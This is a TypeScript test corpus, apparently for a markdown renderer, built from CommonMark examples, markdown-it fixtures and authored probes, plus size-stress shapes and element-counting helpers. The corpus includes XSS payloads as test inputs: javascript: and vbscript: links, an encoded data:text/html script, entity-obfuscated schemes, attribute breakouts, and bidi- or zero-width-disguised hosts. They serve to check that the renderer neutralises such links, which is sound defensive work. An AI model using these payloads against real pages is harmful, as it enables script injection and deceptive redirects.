  { name: 'CommonMark example 488 (Links)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 488, section "Links"', source: '[link](/my uri)', outcome: 'ok', text: ['[link](/my uri)'], controls: [] },
  { name: 'CommonMark example 489 (Links)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 489, section "Links"', source: '[link](</my uri>)', outcome: 'ok', text: ['link'], controls: [], inert: 1 },
  { name: 'CommonMark example 492 (Links)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 492, section "Links"', source: '[a](<b)c>)', outcome: 'ok', text: ['a'], controls: [], inert: 1 },
  { name: 'CommonMark example 496 (Links)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 496, section "Links"', source: '[link](foo(and(bar)))', outcome: 'ok', text: ['link'], controls: [], inert: 1 },
  { name: 'CommonMark example 497 (Links)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 497, section "Links"', source: '[link](foo(and(bar))', outcome: 'ok', text: ['[link](foo(and(bar))'], controls: [] },
  { name: 'CommonMark example 498 (Links)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 498, section "Links"', source: '[link](foo\\(and\\(bar\\))', outcome: 'ok', text: ['link'], controls: [], inert: 1 },
  { name: 'CommonMark example 500 (Links)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 500, section "Links"', source: '[link](foo\\)\\:)', outcome: 'ok', text: ['link'], controls: [], inert: 1 },
  { name: 'CommonMark example 503 (Links)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 503, section "Links"', source: '[link](foo%20b&auml;)', outcome: 'ok', text: ['link'], controls: [], inert: 1 },
  { name: 'CommonMark example 504 (Links)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 504, section "Links"', source: '[link]("title")', outcome: 'ok', text: ['link'], controls: [], inert: 1 },
  { name: 'CommonMark example 506 (Links)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 506, section "Links"', source: '[link](/url "title \\"&quot;")', outcome: 'ok', text: ['link'], controls: [], inert: 1 },
  { name: 'CommonMark example 507 (Links)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 507, section "Links"', source: '[link](/url\u00A0"title")', outcome: 'ok', text: ['link'], controls: [], inert: 1 },
  { name: 'CommonMark example 524 (Links)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 524, section "Links"', source: '[foo <bar attr="](baz)">', outcome: 'ok', text: ['foo <bar attr="'], controls: [], inert: 1 },
  { name: 'CommonMark example 526 (Links)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 526, section "Links"', source: '[foo<https://example.com/?search=](uri)>', outcome: 'ok', text: ['[foo'], controls: [ext('https://example.com/?search=%5D(uri)')] },
  { name: 'CommonMark example 572 (Images)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 572, section "Images"', source: '![foo](/url "title")', outcome: 'ok', text: ['foo'], controls: [] },
  { name: 'CommonMark example 573 (Images)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 573, section "Images"', source: '![foo *bar*]\n\n[foo *bar*]: train.jpg "train & tracks"', outcome: 'ok', text: ['foo bar'], controls: [] },
  { name: 'CommonMark example 574 (Images)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 574, section "Images"', source: '![foo ![bar](/url)](/url2)', outcome: 'ok', text: ['foo bar'], controls: [] },
  { name: 'CommonMark example 575 (Images)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 575, section "Images"', source: '![foo [bar](/url)](/url2)', outcome: 'ok', text: ['foo bar'], controls: [] },
  { name: 'CommonMark example 580 (Images)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 580, section "Images"', source: '![foo](<url>)', outcome: 'ok', text: ['foo'], controls: [] },
  { name: 'CommonMark example 193 (Link reference definitions)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 193, section "Link reference definitions"', source: '   [foo]: \n      /url  \n           \'the title\'  \n\n[foo]', outcome: 'ok', text: ['foo'], controls: [], inert: 1 },
  { name: 'CommonMark example 195 (Link reference definitions)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 195, section "Link reference definitions"', source: '[Foo bar]:\n<my url>\n\'title\'\n\n[Foo bar]', outcome: 'ok', text: ['Foo bar'], controls: [], inert: 1 },
  { name: 'CommonMark example 201 (Link reference definitions)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 201, section "Link reference definitions"', source: '[foo]: <bar>(baz)\n\n[foo]', outcome: 'ok', text: ['[foo]: <bar>(baz)'], controls: [] },
  { name: 'CommonMark example 202 (Link reference definitions)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 202, section "Link reference definitions"', source: '[foo]: /url\\bar\\*baz "foo\\"bar\\baz"\n\n[foo]', outcome: 'ok', text: ['foo'], controls: [], inert: 1 },
  { name: 'CommonMark example 209 (Link reference definitions)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 209, section "Link reference definitions"', source: '[foo]: /url "title" ok', outcome: 'ok', text: ['[foo]: /url "title" ok'], controls: [] },
  { name: 'CommonMark example 12 (Backslash escapes)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 12, section "Backslash escapes"', source: '\\!\\"\\#\\$\\%\\&\\\'\\(\\)\\*\\+\\,\\-\\.\\/\\:\\;\\<\\=\\>\\?\\@\\[\\\\\\]\\^\\_\\`\\{\\|\\}\\~', outcome: 'ok', text: ['!"#$%&\'()*+,-./:;<=>?@[\\]^_`{'], controls: [] },
  { name: 'CommonMark example 13 (Backslash escapes)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 13, section "Backslash escapes"', source: '\\\t\\A\\a\\ \\3\\\u03C6\\\u00AB', outcome: 'ok', text: ['\\'], controls: [] },
  { name: 'CommonMark example 20 (Backslash escapes)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 20, section "Backslash escapes"', source: '<https://example.com?find=\\*>', outcome: 'ok', text: ['https://example.com?find=\\*'], controls: [ext('https://example.com?find=%5C*')] },
  { name: 'CommonMark example 21 (Backslash escapes)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 21, section "Backslash escapes"', source: '<a href="/bar\\/)">', outcome: 'ok', text: ['<a href="/bar/)">'], controls: [] },
  { name: 'CommonMark example 22 (Backslash escapes)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 22, section "Backslash escapes"', source: '[foo](/bar\\* "ti\\*tle")', outcome: 'ok', text: ['foo'], controls: [], inert: 1 },
  { name: 'CommonMark example 23 (Backslash escapes)', origin: 'commonmark', cite: 'CommonMark spec 0.31.2 (spec.commonmark.org/0.31.2/spec.json), example 23, section "Backslash escapes"', source: '[foo]\n\n[foo]: /bar\\* "ti\\*tle"', outcome: 'ok', text: ['foo'], controls: [], inert: 1 },
  { name: 'markdown-it xss.txt case 1', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/xss.txt, case 1 (line 1)', source: '[normal link](javascript)', outcome: 'ok', text: ['normal link'], controls: [], inert: 1 },
  { name: 'markdown-it xss.txt case 2', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/xss.txt, case 2 (line 9)', source: '[xss link](javascript:alert(1))\n\n[xss link](JAVASCRIPT:alert(1))\n\n[xss link](vbscript:alert(1))\n\n[xss link](VBSCRIPT:alert(1))\n\n[xss link](file:///123)', outcome: 'ok', text: ['[xss link](javascript:alert(1))'], controls: [] },
  { name: 'markdown-it xss.txt case 3', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/xss.txt, case 3 (line 28)', source: '[xss link](&#34;&#62;&#60;script&#62;alert&#40;&#34;xss&#34;&#41;&#60;/script&#62;)\n\n[xss link](&#74;avascript:alert(1))\n\n[xss link](&#x26;#74;avascript:alert(1))\n\n[xss link](\\&#74;avascript:alert(1))', outcome: 'ok', text: ['xss link'], controls: [], inert: 3 },
  { name: 'markdown-it xss.txt case 4', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/xss.txt, case 4 (line 43)', source: '[xss link](<javascript:alert(1)>)', outcome: 'ok', text: ['[xss link](<javascript:alert(1)>)'], controls: [] },
  { name: 'markdown-it xss.txt case 5', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/xss.txt, case 5 (line 49)', source: '[xss link](javascript&#x3A;alert(1))', outcome: 'ok', text: ['[xss link](javascript:alert(1))'], controls: [] },
  { name: 'markdown-it xss.txt case 6', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/xss.txt, case 6 (line 57)', source: '![](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)', outcome: 'ok', text: ['Image'], controls: [] },
  { name: 'markdown-it xss.txt case 7', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/xss.txt, case 7 (line 63)', source: '[xss link](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)', outcome: 'ok', text: ['[xss link](data:text/html;base64,PHNjcmlwdD5hbGV'], controls: [] },
  { name: 'markdown-it xss.txt case 8', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/xss.txt, case 8 (line 69)', source: '[normal link](/javascript:link)', outcome: 'ok', text: ['normal link'], controls: [], inert: 1 },
  { name: 'markdown-it xss.txt case 9', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/xss.txt, case 9 (line 77)', source: '![xss link](javascript:alert(1))', outcome: 'ok', text: ['![xss link](javascript:alert(1))'], controls: [] },
  { name: 'markdown-it xss.txt case 10', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/xss.txt, case 10 (line 85)', source: '<javascript&#x3A;alert(1)>\n\n<javascript:alert(1)>', outcome: 'ok', text: ['<javascript:alert(1)>'], controls: [] },
  { name: 'markdown-it xss.txt case 11', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/xss.txt, case 11 (line 96)', source: 'javascript&#x3A;alert(1)\n\njavascript:alert(1)', outcome: 'ok', text: ['javascript:alert(1)'], controls: [] },
  { name: 'markdown-it xss.txt case 12', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/xss.txt, case 12 (line 107)', source: '[test]: javascript:alert(1)', outcome: 'ok', text: ['[test]: javascript:alert(1)'], controls: [] },
  { name: 'markdown-it xss.txt case 13', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/xss.txt, case 13 (line 115)', source: '```js&#32;custom-class\ntest1\n```\n\n```js&#x0C;custom-class\ntest2\n```', outcome: 'ok', text: ['test1'], controls: [] },
  { name: 'markdown-it proto.txt case 1', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/proto.txt, case 1 (line 1)', source: '[__proto__]\n\n[__proto__]: blah', outcome: 'ok', text: ['not a followable link'], controls: [], inert: 1 },
  { name: 'markdown-it proto.txt case 2', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/proto.txt, case 2 (line 10)', source: '[hasOwnProperty]\n\n[hasOwnProperty]: blah', outcome: 'ok', text: ['hasOwnProperty'], controls: [], inert: 1 },
  { name: 'markdown-it normalize.txt case 1', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/normalize.txt, case 1 (line 4)', source: '<http://example.com/\u03B1%CE%B2\u03B3%CE%B4>', outcome: 'ok', text: ['http://example.com/\u03B1\u03B2\u03B3\u03B4'], controls: [ext('http://example.com/%CE%B1%CE%B2%CE%B3%CE%B4')] },
  { name: 'markdown-it normalize.txt case 2', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/normalize.txt, case 2 (line 10)', source: '[foo](http://example.com/\u03B1%CE%B2\u03B3%CE%B4)', outcome: 'ok', text: ['foo'], controls: [ext('http://example.com/%CE%B1%CE%B2%CE%B3%CE%B4')] },
  { name: 'markdown-it normalize.txt case 4', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/normalize.txt, case 4 (line 27)', source: '<http://xn--n3h.net/>', outcome: 'ok', text: ['http://\u2603.net/'], controls: [ext('http://xn--n3h.net/')] },
  { name: 'markdown-it normalize.txt case 5', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/normalize.txt, case 5 (line 33)', source: '<http://\u2603.net/>', outcome: 'ok', text: ['http://\u2603.net/'], controls: [ext('http://xn--n3h.net/')] },
  { name: 'markdown-it normalize.txt case 8', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/normalize.txt, case 8 (line 57)', source: '[](//\u2603.net/)', outcome: 'ok', text: ['not a followable link'], controls: [], inert: 1 },
  { name: 'markdown-it normalize.txt case 9', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/normalize.txt, case 9 (line 65)', source: '[foo](http://[2001:db8::1]:1896/a[b]?x=[y])', outcome: 'ok', text: ['foo'], controls: [ext('http://[2001:db8::1]:1896/a%5Bb%5D?x=%5By%5D')] },
  { name: 'markdown-it normalize.txt case 10', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/normalize.txt, case 10 (line 71)', source: '[foo](//[::ffff:192.0.2.1]/)', outcome: 'ok', text: ['foo'], controls: [], inert: 1 },
  { name: 'markdown-it normalize.txt case 11', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/normalize.txt, case 11 (line 77)', source: '[foo](http://user:password@[2001:db8:0:0:0:0:0:1]:1926/)', outcome: 'ok', text: ['foo'], controls: [], inert: 1 },
  { name: 'markdown-it normalize.txt case 12', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/normalize.txt, case 12 (line 85)', source: '[](skype:\u03B3\u03B3\u03B3)', outcome: 'ok', text: ['not a followable link'], controls: [], inert: 1 },
  { name: 'markdown-it normalize.txt case 13', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/normalize.txt, case 13 (line 93)', source: 'test http://xn--n3h.net/ foo', outcome: 'ok', text: ['test http://xn--n3h.net/ foo'], controls: [] },
  { name: 'markdown-it normalize.txt case 14', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/normalize.txt, case 14 (line 99)', source: 'test http://\u2603.net/ foo', outcome: 'ok', text: ['test http://\u2603.net/ foo'], controls: [] },
  { name: 'markdown-it normalize.txt case 15', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/normalize.txt, case 15 (line 105)', source: 'test //xn--n3h.net/ foo', outcome: 'ok', text: ['test //xn--n3h.net/ foo'], controls: [] },
  { name: 'markdown-it commonmark_extras.txt case 2', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 2 (line 9)', source: '![&](#)', outcome: 'ok', text: ['&'], controls: [] },
  { name: 'markdown-it commonmark_extras.txt case 3', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 3 (line 16)', source: '![*strip* [markdown __in__ alt](#)](#)', outcome: 'ok', text: ['strip markdown in alt'], controls: [] },
  { name: 'markdown-it commonmark_extras.txt case 4', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 4 (line 23)', source: '![test]\n\n![test](foo bar)', outcome: 'ok', text: ['![test]'], controls: [] },
  { name: 'markdown-it commonmark_extras.txt case 10', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 10 (line 96)', source: '[test](<\\f\\o\\o\\>\\\\>)\n\n[test](foo "\\\\\\"\\b\\a\\r")', outcome: 'ok', text: ['test'], controls: [], inert: 2 },
  { name: 'markdown-it commonmark_extras.txt case 11', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 11 (line 107)', source: '</ 123>', outcome: 'ok', text: ['</ 123>'], controls: [] },
  { name: 'markdown-it commonmark_extras.txt case 12', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 12 (line 116)', source: '[](<&quot;> "&amp;&ouml;")\n\n[](<\\&quot;> "\\&amp;\\&ouml;")\n\n[](<\\\\&quot;> "\\\\&quot;\\\\&ouml;")', outcome: 'ok', text: ['not a followable link'], controls: [], inert: 3 },
  { name: 'markdown-it commonmark_extras.txt case 27', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 27 (line 322)', source: '[](<foo<bar>)\n\n[](<foo\\<bar>)', outcome: 'ok', text: ['[](<foo<bar>)'], controls: [], inert: 1 },
  { name: 'markdown-it commonmark_extras.txt case 28', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 28 (line 333)', source: '[](url (xxx())\n\n[](url (xxx\\())', outcome: 'ok', text: ['[](url (xxx())'], controls: [], inert: 1 },
  { name: 'markdown-it commonmark_extras.txt case 29', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 29 (line 344)', source: '[link](a\\ b)', outcome: 'ok', text: ['[link](a\\ b)'], controls: [] },
  { name: 'markdown-it commonmark_extras.txt case 30', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 30 (line 352)', source: 'a <?\n?>', outcome: 'ok', text: ['a <?'], controls: [] },
  { name: 'markdown-it commonmark_extras.txt case 31', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 31 (line 362)', source: 'City:\n<span itemprop="contentLocation" itemscope itemtype="https://schema.org/City">\n  <meta itemprop="name" content="Springfield">\n</span>', outcome: 'ok', text: ['City:'], controls: [] },
  { name: 'markdown-it commonmark_extras.txt case 32', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 32 (line 376)', source: 'a\n<?php', outcome: 'ok', text: ['a'], controls: [] },
  { name: 'markdown-it commonmark_extras.txt case 38', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 38 (line 432)', source: '[foo](<\nbar>)\n\n[foo](<bar)', outcome: 'ok', text: ['[foo](<'], controls: [] },
  { name: 'markdown-it commonmark_extras.txt case 39', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 39 (line 445)', source: '[foo](bar "ba)\n\n[foo](bar "ba\\\nz")', outcome: 'ok', text: ['[foo](bar "ba)'], controls: [], inert: 1 },
  { name: 'markdown-it commonmark_extras.txt case 43', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 43 (line 477)', source: '![test](', outcome: 'ok', text: ['![test]('], controls: [] },
  { name: 'markdown-it commonmark_extras.txt case 44', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 44 (line 485)', source: '[test](', outcome: 'ok', text: ['[test]('], controls: [] },
  { name: 'markdown-it commonmark_extras.txt case 51', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 51 (line 642)', source: '&#x110000;\n\n&#x1100000;', outcome: 'ok', text: ['\uFFFD'], controls: [] },
  { name: 'markdown-it commonmark_extras.txt case 57', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 57 (line 738)', source: '![text <textarea> text](image.png)', outcome: 'ok', text: ['text <textarea> text'], controls: [] },
  { name: 'markdown-it commonmark_extras.txt case 59', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 59 (line 755)', source: '&parag;\n\n&para\n\n&para;', outcome: 'ok', text: ['&parag;'], controls: [] },
  { name: 'markdown-it commonmark_extras.txt case 65', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 65 (line 858)', source: '[a](/url\\ )', outcome: 'ok', text: ['a'], controls: [], inert: 1 },
  { name: 'markdown-it commonmark_extras.txt case 66', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 66 (line 865)', source: '[a](/url\\ "title")', outcome: 'ok', text: ['a'], controls: [], inert: 1 },
  { name: 'markdown-it commonmark_extras.txt case 67', origin: 'markdown-it', cite: 'markdown-it 15.0.2, test/fixtures/markdown-it/commonmark_extras.txt, case 67 (line 872)', source: 'foo\n<!bar baz>', outcome: 'ok', text: ['foo'], controls: [] },

  // --- the reviewer's probes (review cycle 1), authored: no fetched source -----------------------------------------------------------
  { name: 'probe 02: autolinks with entities, quotes and disguised schemes', origin: 'authored', source: '<http://a.invalid/&quot;onmouseover=&quot;alert(1)> <javascript&#58;alert(1)> <http://a.invalid/&#x3C;script&#x3E;> <data:text/html,&lt;script&gt;>', outcome: 'ok', text: ['http://a.invalid/&quot;onmouseover=&quot;alert(1)', '<javascript:alert(1)>', '<data:text/html,'], controls: [ext('http://a.invalid/&quot;onmouseover=&quot;alert(1)'), ext('http://a.invalid/&#x3C;script&#x3E;')] },
  { name: 'probe 06: zero-width and bidirectional controls in a scheme, a host and a path', origin: 'authored', source: `[a](java${ZW}script:alert(1)) [b](https://e${RLO}vil.invalid/) [c](${ZW}b.md) [d](b.md${ZW}) [e](https://g${LRI}oogle.invalid/) [f](https://xn--e-ufa.invalid/)`, outcome: 'ok', text: ['a', 'f', 'not a followable link'], controls: [ext('https://xn--evil-vd7a.invalid/'), ext('https://xn--google-ix0c.invalid/'), ext('https://xn--e-ufa.invalid/')], inert: 3 },
  { name: 'probe 08: protocol-relative, backslash and scheme-less hosts', origin: 'authored', source: `[a](//evil.invalid) [b](${BS}${BS}evil.invalid) [c](/${BS}evil.invalid) [d](https:evil.invalid) [e](http:/evil.invalid) [f](https:///evil.invalid) [g](HTTP://user:pw@evil.invalid) [h](https://evil.invalid${BS}@good.invalid/)`, outcome: 'ok', text: ['a', 'h', 'not a followable link'], controls: [], inert: 8 },
  { name: 'probe 11: angle destination with a space, mailto tricks, percent-encoded host, breakout in a fragment', origin: 'authored', source: '[a](<javascript:alert(1) x>) [b](mailto:javascript:alert(1)@x.invalid) [c](mailto:a@b.invalid,c@d.invalid) [d](http://%6a%61%76%61.invalid/) [e](b.md#"><script>)', outcome: 'ok', text: ['[a](<javascript:alert(1) x>)', 'b', 'e'], controls: [ext('mailto:javascript:alert(1)@x.invalid'), ext('http://%6a%61%76%61.invalid/'), B], inert: 1 },

  // --- nesting and size shapes ---------------------------------------------------------------------------------------------------
  { name: 'emphasis nested 10 deep', origin: 'shape', source: nestedMatched(10), outcome: 'ok', text: ['x'] },
  { name: 'emphasis nested 25 deep', origin: 'shape', source: nestedMatched(25), outcome: 'budget' },
  { name: 'emphasis nested 40,000 deep', origin: 'shape', source: nestedMatched(40000, 50, ['*', '_']), outcome: 'budget' },
  { name: 'block quotes nested 12 deep', origin: 'shape', source: nestedQuotes(12), outcome: 'ok', text: ['deep'] },
  { name: 'block quotes nested 150 deep', origin: 'shape', source: nestedQuotes(150), outcome: 'budget' },
  { name: 'bullets nested 8 deep', origin: 'shape', source: nestedBullets(8), outcome: 'ok', text: ['level 8'] },
  { name: 'bullets nested 60 deep', origin: 'shape', source: nestedBullets(60), outcome: 'budget' },
  { name: 'a table cell with 2,000 levels of inline nesting', origin: 'shape', source: `| a |\n| - |\n| ${nestedMatched(2000, 0, ['*', '_'])} |`, outcome: 'budget' },
  { name: '32,001 table cells', origin: 'shape', source: tableOfCells(32001), outcome: 'budget' },
  { name: '150,001 inline tokens in one paragraph', origin: 'shape', source: Array.from({ length: 37501 }, (_, at) => (at % 40 === 39 ? '*a*\n' : '*a* ')).join(''), outcome: 'budget' },
  { name: '5,000 reference definitions', origin: 'shape', source: `${Array.from({ length: 5000 }, (_, at) => `[r${at}]: b.md`).join('\n')}\n\n[r4999]`, outcome: 'ok', text: ['r4999'], controls: [B] },
  { name: '50,000 unmatched emphasis delimiters', origin: 'shape', source: lines(' *a', 150000, SHORT_LINE), outcome: 'ok', text: ['*a'] },
  { name: 'a document of 150,001 tokens', origin: 'shape', source: Array.from({ length: 25001 }, () => '- a').join('\n'), outcome: 'budget' },
  { name: '256 KiB in one line', origin: 'shape', source: repeated('word ', LARGE), outcome: 'too-complex', ceilingMs: 500 },
  { name: 'a source over the size limit', origin: 'shape', source: lines('word ', LARGE + 20 * KIB, SHORT_LINE), outcome: 'too-complex', ceilingMs: 500 },
  { name: 'ordinary prose document of 256 KiB (the large fixture of the stories)', origin: 'shape', source: makeLargeMarkdown(LARGE, 'docs/large.md').content, outcome: 'ok', text: ['Large document', 'Section 1'], ceilingMs: 500 },
  ...(
    [
      // label, unit, the outcome of the 256 KiB shape cut into 200-character lines (pinned by measurement, see the report)
      ['unclosed star', '*a', 'budget'],
      ['unclosed underscore', '_a', 'ok'],
      ['unclosed bracket', '[a', 'ok'],
      ['unclosed parenthesis', '(a', 'ok'],
      ['unclosed backtick', '`a', 'budget'],
      ['unclosed angle', '<a', 'ok'],
      ['unclosed bang', '!a', 'ok'],
      ['quote markers', '> a', 'ok'],
      ['trailing backslash', 'a\\', 'ok'],
      ['pipe rows', '|a|b|', 'ok'],
    ] as const
  ).flatMap(([label, unit, shortOutcome]): CorpusEntry[] => [
    { name: `256 KiB of ${label} in one line`, origin: 'shape', source: repeated(unit, LARGE), outcome: 'too-complex', ceilingMs: 500 },
    { name: `256 KiB of ${label} in short lines`, origin: 'shape', source: lines(unit, LARGE, SHORT_LINE), outcome: shortOutcome, ceilingMs: 500 },
  ]),
];

/** The elements `render.ts` writes for one inline node; links never nest controls (an image or a link inside a link is plain text). */
function inlineElements(nodes: readonly ResolvedInline[], insideLink: boolean): number {
  let count = 0;
  for (const node of nodes) {
    switch (node.kind) {
      case 'text':
      case 'softbreak':
        break;
      case 'hardbreak':
      case 'code':
        count += 1;
        break;
      case 'emphasis':
      case 'strong':
      case 'strike':
        count += 1 + inlineElements(node.children, insideLink);
        break;
      case 'link':
        // The control or the inert span, its hidden suffix word, and the children; inside a link only the children (no second control).
        count += (insideLink ? 0 : 2) + inlineElements(node.children, true);
        break;
      case 'image':
        // The placeholder; as a control (not inside a link, an external destination) it also carries the hidden suffix word.
        count += 1 + (!insideLink && node.target.kind === 'external' ? 1 : 0);
        break;
    }
  }
  return count;
}

/** The number of elements `renderMarkdown` writes for `blocks`, derived from the model alone (the model twin of the walk). */
export function expectedElementCount(blocks: readonly ResolvedBlock[]): number {
  let count = 0;
  for (const block of blocks) {
    switch (block.kind) {
      case 'heading':
      case 'paragraph':
        count += 1 + inlineElements(block.inline, false);
        break;
      case 'list':
        count += 1;
        for (const item of block.items) count += 1 + expectedElementCount(item);
        break;
      case 'quote':
        count += 1 + expectedElementCount(block.blocks);
        break;
      case 'rule':
        count += 1;
        break;
      case 'code':
        count += 2;
        break;
      case 'table': {
        // div box, table, thead, its row, tbody
        count += 5;
        for (const cell of block.head) count += 1 + inlineElements(cell, false);
        for (const row of block.rows) {
          count += 1;
          for (const cell of row) count += 1 + inlineElements(cell, false);
        }
        break;
      }
    }
  }
  return count;
}
